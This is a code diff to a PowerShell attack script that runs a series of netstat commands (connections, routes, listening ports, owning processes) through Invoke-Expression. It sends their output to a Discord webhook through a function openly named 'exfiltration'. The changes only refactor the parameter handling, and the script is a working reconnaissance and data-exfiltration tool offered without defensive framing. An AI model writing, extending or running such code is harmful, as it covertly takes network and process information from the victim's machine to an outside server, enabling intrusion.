@@ -1,6 +1,10 @@
 
 # Discord send function
-function exfiltration ($command, $text) {
+function exfiltration () {
+	param(
+		[Parameter (Mandatory = $true, Position=0)] [String]$command,
+		[Parameter (Mandatory = $true, Position=1)] [String]$text
+	)
 	# Loop for Discord
 	$ConstantLimitForRestMethod = 1999
 	$TMP_Body = @{
@@ -23,45 +27,50 @@ function exfiltration ($command, $text) {
 				break
 			}
 		}
-		Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($TMP_Body | ConvertTo-Json)
+		Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($TMP_Body | ConvertTo-Json)
 	}
 }
 
 # send command format
-function send_command($command){
-	$out = Invoke-Expression $command
-	exfiltration($command, $out)
+function send_command(){
+	param(
+		[Parameter (Mandatory = $true, Position=0)] [String]$cmd
+	)
+	$out = Invoke-Expression $cmd
+	(exfiltration $cmd [string]$out)
 }
-
-# Discord Connection
-$hookurl = "$discord"
 
 # Settings
 if ( $d -eq "1") {
 	$cmd = "netstat"
-	echo "Starting " + $cmd
-	send_command($cmd)
+	(send_command $cmd)
 }
 if ( $r -eq "1") {
-	send_command("netstat -r")
+	$cmd = "netstat -r"
+	(send_command $cmd)
 }
 if ( $lc -eq "1") {
-	send_command("netstat -af")
+	$cmd = "netstat -af"
+	(send_command $cmd)
 }
 if ( $ln -eq "1") {
-	send_command("netstat -an")
+	$cmd = "netstat -an"
+	(send_command $cmd)
 }
 if ( $ac -eq "1") {
-	send_command("netstat -qf")
+	$cmd = "netstat -qf"
+	(send_command $cmd)
 }
 if ( $an -eq "1") {
-	send_command("netstat -qn")
+	$cmd = "netstat -qn"
+	(send_command $cmd)
 }
 if ( $o -eq "1") {
-	send_command("netstat -t")
+	$cmd = "netstat -t"
+	(send_command $cmd)
 }
 if ( $p -ne "" ) {
 	# format $proto="TCP"
 	$cmd = "netstat -ps " + $p
-	send_command($cmd)
+	(send_command $cmd)
 }
